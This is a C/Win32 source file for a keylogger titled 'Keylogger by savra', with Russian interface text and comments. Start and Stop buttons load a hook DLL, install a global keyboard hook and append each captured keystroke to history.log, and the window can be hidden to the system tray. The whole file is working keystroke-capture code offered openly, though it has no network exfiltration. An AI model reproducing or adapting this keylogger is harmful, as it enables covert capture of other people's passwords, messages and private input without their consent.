#include <Windows.h>
#include <tchar.h>
#include "resource.h"
#include <stdio.h>

const int ID_BUTTON_START = 3000;
const int ID_BUTTON_STOP = 3001;
bool HOOK_WORK = false;
static TCHAR szWindowClass[] = _T("win32app");
static TCHAR szTitle[] = _T("Keylogger by savra");
HINSTANCE hInst;
int width = 330, height = 200;
#define WM_FLIPPED_TO_TRAY (WM_APP + 1234)
#define ID_FLIPPED_TO_TRAY 1234
#define WM_HOOKMESSAGE WM_USER + 1

int ( * SetHook)( HWND,UINT);
int (* UnSetHook)();

HINSTANCE hDllInst;
HWND hWnd;

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
BOOL FlipToTray(HWND hWnd, BOOL bMinimize);
BOOL UnflipFromTray(HWND hWnd, BOOL bRestore);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	WNDCLASSEX wcex;
	wcex.cbSize = sizeof(WNDCLASSEX);
	wcex.style = CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc = WndProc;
	wcex.cbClsExtra = 0;
	wcex.cbWndExtra  = 0;
	wcex.hInstance  = hInstance;
	wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_APPLICATION));
	wcex.hCursor = LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wcex.lpszMenuName = NULL;
	wcex.lpszClassName = szWindowClass;
	wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_APPLICATION));

	if(!RegisterClassEx(&wcex))
	{
		MessageBox(NULL, _T("Call to RegisterClassEx failed!"), _T("Win32 Guided Tour"), NULL);

		return 1;
	}

	hInst = hInstance; 


	hWnd = CreateWindow(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW & ~WS_THICKFRAME & ~WS_MAXIMIZEBOX, (GetSystemMetrics(SM_CXSCREEN) - width) / 2, (GetSystemMetrics(SM_CYSCREEN) - height) / 2, 
		width, height, NULL, NULL, hInstance, NULL);

	if (!hWnd)
	{
		MessageBox(NULL, _T("Call to CreateWindow failed!"), _T("Win32 Guided Tour"), NULL);

		return 1;
	}

	ShowWindow(hWnd, nCmdShow);
	UpdateWindow(hWnd);

	hDllInst = LoadLibrary(_T("HookDll.dll"));

	if (!hDllInst)
	{
		MessageBox(NULL, _T("DLL DO NOT LOAD"), _T("Message"), MB_OK);
		return 1;
	}
	else
	{
		SetHook = (int (*)(HWND, UINT ))GetProcAddress(hDllInst, "SetHook");
		UnSetHook = (int (*)( ))GetProcAddress(hDllInst, "UnSetHook");
	}

	MSG msg;

	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return (int)msg.wParam;
}
FILE *f;
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	PAINTSTRUCT ps;
	HDC hdc;
	TCHAR greeting[] = _T("По умолчанию лог сохраняется в папку C:\\log");
	static HWND hButtonStart, hButtonStop;
	//FILE *f = fopen("history.log", "a");


	switch (message)
	{
	case WM_CREATE:
		hButtonStart = CreateWindow(_T("button"), _T("Запуск"), WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON, width - 200, height - 70, 70, 20, hWnd, (HMENU)ID_BUTTON_START, hInst, NULL);
		hButtonStop = CreateWindow(_T("button"), _T("Остановить"), WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON, width - 110, height - 70, 90, 20, hWnd, (HMENU)ID_BUTTON_STOP, hInst, NULL);
		break;

	case WM_PAINT:
		hdc = BeginPaint(hWnd, &ps);
		TextOut(hdc, 5, 5, greeting, _tcslen(greeting));
		EndPaint(hWnd, &ps);
		break;
	case WM_COMMAND:
		switch (LOWORD(wParam))
		{
		case ID_BUTTON_START:
			MessageBox(hWnd, _T("Кейлоггер запущен"), _T("Информационное сообещение"), MB_OK);
			EnableWindow(hButtonStart, false);
			SetHook(hWnd, WM_HOOKMESSAGE);
			f = fopen("history.log", "a");
			SendMessage(HWND(lParam), BM_SETSTATE, true, NULL);
			break;
		case ID_BUTTON_STOP:
			MessageBox(hWnd, _T("Кейлоггер остановлен"), _T("Информационное сообещение"), MB_OK);
			EnableWindow(hButtonStart, true);
			if (!SendMessage(hButtonStart, BM_GETCHECK, 0, NULL))
			{
				SendMessage(hButtonStart, BM_SETSTATE, FALSE, NULL);
				UnSetHook();
				if(f != NULL)
					fclose(f);
				f = NULL;
			}
			break;
		default:
			break;
		}
		break;
	case WM_SIZE:
		if(wParam == SIZE_MINIMIZED)
			FlipToTray(hWnd, FALSE);
		break;
	case WM_FLIPPED_TO_TRAY:
		if(wParam == ID_FLIPPED_TO_TRAY && lParam == WM_LBUTTONDBLCLK)
			UnflipFromTray(hWnd, TRUE);
		break;
	case WM_HOOKMESSAGE:
		switch(wParam)
		{
			// для некоторых символов выведем их "название"
		case 0x08: 
			fprintf(f, "");
			break;
		case 0x0D: 
			fprintf(f, "\n");
			break;
			// это клавиша Esc
		case 0x1B: 
			fprintf(f, "[Esc]");
			break;
		case 0x10: 
			fprintf(f, "Shift");
			break;
		case 0x09: 
			fprintf(f, "Tab");
			break;
		case 0x20: 
			fprintf(f, "_");
			break;
		default:
			fprintf(f, "%c", wParam); //Записываем данные в файл
		} 
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		UnSetHook();
		if (hDllInst) 
			FreeLibrary(hDllInst);	
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
		break;
	}

	return 0;
}

BOOL FlipToTray(HWND hWnd, BOOL bMinimize)
{
	// создаем иконку
	NOTIFYICONDATA notifyData;
	memset(&notifyData, 0, sizeof(notifyData));

	notifyData.cbSize = sizeof(notifyData);
	notifyData.hWnd = hWnd;
	notifyData.uID = ID_FLIPPED_TO_TRAY;
	notifyData.hIcon = LoadIcon(hInst, MAKEINTRESOURCE(IDI_ICON1));
	notifyData.uFlags = NIF_ICON | NIF_TIP | NIF_MESSAGE;
	notifyData.uCallbackMessage = WM_FLIPPED_TO_TRAY;
	lstrcpyn(notifyData.szTip, _T("KeyLogger by savra v 1. 0."), sizeof(notifyData.szTip)/sizeof(notifyData.szTip[0]));

	// показываем ее
	BOOL ok = Shell_NotifyIcon(NIM_ADD, &notifyData);

	// прячем окно
	if(bMinimize)
		ShowWindow(hWnd, SW_MINIMIZE);

	if(ok) // только, если удалось показать иконку
		ShowWindow(hWnd, SW_HIDE);

	return ok;
}

BOOL UnflipFromTray(HWND hWnd, BOOL bRestore)
{
	// идентифицируем иконку
	NOTIFYICONDATA notifyData;
	memset(&notifyData, 0, sizeof(notifyData));

	notifyData.cbSize = sizeof(notifyData);
	notifyData.hWnd = hWnd;
	notifyData.uID = ID_FLIPPED_TO_TRAY;

	// удаляем ее
	BOOL ok = Shell_NotifyIcon(NIM_DELETE, &notifyData);

	if(!bRestore) return ok;

	// восстанавливаем окно
	ShowWindow(hWnd, SW_SHOW);
	ShowWindow(hWnd, SW_RESTORE);

	return ok;
}